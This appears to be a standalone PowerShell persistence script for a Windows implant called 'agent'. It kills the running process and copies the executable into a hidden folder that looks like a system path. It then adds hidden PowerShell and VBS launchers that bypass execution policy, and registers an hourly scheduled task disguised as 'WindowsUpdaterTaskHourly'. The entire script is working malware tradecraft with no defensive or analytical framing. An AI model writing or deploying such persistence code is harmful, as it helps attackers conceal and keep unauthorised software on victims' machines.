$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'

# --- Find agent path automatically from running process ---
$agentProc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $agentProc) {
    Write-Output "ERROR: No running agent.exe found"
    exit 1
}
$sourcePath = $agentProc.Path
Write-Output "[+] Found agent at: $sourcePath"

# --- Stop the agent so we can copy it ---
Write-Output "[+] Stopping current agent process (PID $($agentProc.Id))"
Stop-Process -Id $agentProc.Id -Force
Start-Sleep -Seconds 1

# --- Hidden folder ---
$hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $hideDir)) {
    New-Item -ItemType Directory -Path $hideDir -Force | Out-Null
    attrib +h $hideDir
    Write-Output "[+] Created hidden folder: $hideDir"
}

# --- Copy agent to hidden folder ---
$agentFile = "$hideDir\agent.exe"
# Remove any existing file first
if (Test-Path $agentFile) {
    Remove-Item -Path $agentFile -Force -ErrorAction SilentlyContinue
}
Copy-Item -LiteralPath $sourcePath -Destination $agentFile -Force
if (-not (Test-Path $agentFile)) {
    Write-Output "ERROR: Failed to copy agent to $agentFile"
    exit 1
}
attrib +h $agentFile
Write-Output "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"

# --- Launcher script (just runs the exe) ---
$launcherPath = "$hideDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
Start-Process -WindowStyle Hidden -FilePath '$agentFile'
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath

# --- VBS launcher ---
$vbsPath = "$hideDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath

# --- Scheduled task: every 1 hour ---
$taskName = "WindowsUpdaterTaskHourly"
schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it
if ($LASTEXITCODE -eq 0) {
    Write-Output "✅ Scheduled task created (runs every 1 hour)."
    # Launch the agent now
    Start-Process -WindowStyle Hidden -FilePath $agentFile
    Write-Output "✅ Agent launched from hidden folder."
} else {
    Write-Output "❌ Task creation failed with exit code $LASTEXITCODE"
    exit 1
}

Write-Output "`n✅ PERSISTENCE COMPLETE"
Write-Output "Agent now runs from: $agentFile (hidden)"
Write-Output "Task '$taskName' will re-launch it every hour."
